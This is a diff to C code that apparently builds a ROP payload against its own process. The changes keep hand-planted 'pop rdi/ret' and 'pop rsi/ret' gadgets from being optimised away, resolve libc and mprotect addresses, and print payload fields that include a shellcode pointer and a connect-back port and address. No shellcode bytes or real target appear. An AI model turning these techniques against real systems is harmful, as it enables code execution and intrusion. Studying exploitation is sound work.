@@ -128,20 +128,23 @@ static void populate(PayloadPtr plp) {
 	plp->scu.sc.address[2]	= 4;
 	plp->scu.sc.address[3]	= 5;
 
-	// The conditional return below keeps the optimizer from removing the tail (that I need for a couple of gadgets
-	if (plp != NULL)
-		return;
+	// This construct keeps the compiler from removing what it thinks is dead code in gadgets that follow:
+	int volatile v = 0;
 
-	// The following code is a hack to give us a couple of gadgets (referenced above as &&l_poprdi and &&l_poprsi)
-	// The code should never be reached under normal conditions, so the optimizer wants to cull it out.
-	// The conditional return above (which always executes) keeps the gadgets from being optimized out, but...
-	// Is there a better way to tell the optimizer to lay-off the rest of the function and leave it around?
+	// 
+	if (v) {
 l_poprdi:
-	__asm__ __volatile__ ("pop %rdi");
-	__asm__ __volatile__ ("ret");
+		__asm__ ("pop %rdi");
+		__asm__ ("ret");
+	}
+
+	if (v) {
 l_poprsi:
-	__asm__ __volatile__ ("pop %rsi");
-	__asm__ __volatile__ ("ret");
+		__asm__ ("pop %rsi");
+		__asm__ ("ret");
+	}
+
+	return;
 } // populate()
 
 static void disclose(PayloadPtr plp) {
@@ -149,7 +152,7 @@ static void disclose(PayloadPtr plp) {
 	void *libc_read       = dlsym(RTLD_NEXT, s_libc_read);
 	void *libc_base       = libcBase(libc_mprotect);
 
-	printf("In disclose()()\n");
+	printf("In disclose()\n");
 
 	ptrdiff_t libc_mprotect_offset   = libc_mprotect - libc_base;
 
@@ -157,23 +160,21 @@ static void disclose(PayloadPtr plp) {
 	printf("%20s: %p\n",           s_libc_base,       libc_base);
 	printf("%20s: %p (0x%08tx)\n", s_libc_mprotect,   libc_mprotect, libc_mprotect_offset);
 	printf("--------------------------------------------\n");
-	printf("%20s: %p\n",           s_libc_base,       libc_base);
-	printf("port: %d\n", ntohs(plp->scu.sc.port));
-	printf("address: %d.%d.%d.%d\n", plp->scu.sc.address[0], plp->scu.sc.address[1], plp->scu.sc.address[2], plp->scu.sc.address[3]);
-	printf("--------------------------------------------\n");
 } // disclose()
 
 static void dumpload(PayloadPtr plp) {
 	printf("In dumpload()\n");
 
 	printf("--------------------------------------------\n");
-	printf("%20s: %p\n",           "pl_popRDI",       plp->pl_popRDI);
-	printf("%20s: %p\n",           "pl_stackStart",   plp->pl_stackStart);
-	printf("%20s: %p\n",           "pl_popRSI",       plp->pl_popRSI);
-	printf("%20s: %tx\n",          "pl_stackSize",    plp->pl_stackSize);
-	printf("%20s: %tx\n",          "pl_permission",   plp->pl_permission);
-	printf("%20s: %p\n",           "pl_mprotect",     plp->pl_mprotect);
-	printf("%20s: %p\n",           "pl_shellCode",    plp->pl_shellCode);
+	printf("%20s: %p\n",           "plp->pl_popRDI",       plp->pl_popRDI);
+	printf("%20s: %p\n",           "plp->pl_stackStart",   plp->pl_stackStart);
+	printf("%20s: %p\n",           "plp->pl_popRSI",       plp->pl_popRSI);
+	printf("%20s: %#tx\n",         "plp->pl_stackSize",    plp->pl_stackSize);
+	printf("%20s: %#tx\n",         "plp->pl_permission",   plp->pl_permission);
+	printf("%20s: %p\n",           "plp->pl_mprotect",     plp->pl_mprotect);
+	printf("%20s: %p\n",           "plp->pl_shellCode",    plp->pl_shellCode);
+	printf("%20s: %tu\n",          "plp->scu.sc.port",     ntohs(plp->scu.sc.port));
+	printf("%20s: %d.%d.%d.%d\n",  "plp->scu.sc.address",  plp->scu.sc.address[0], plp->scu.sc.address[1], plp->scu.sc.address[2], plp->scu.sc.address[3]);
 	printf("--------------------------------------------\n");
 } // dumpload()
 
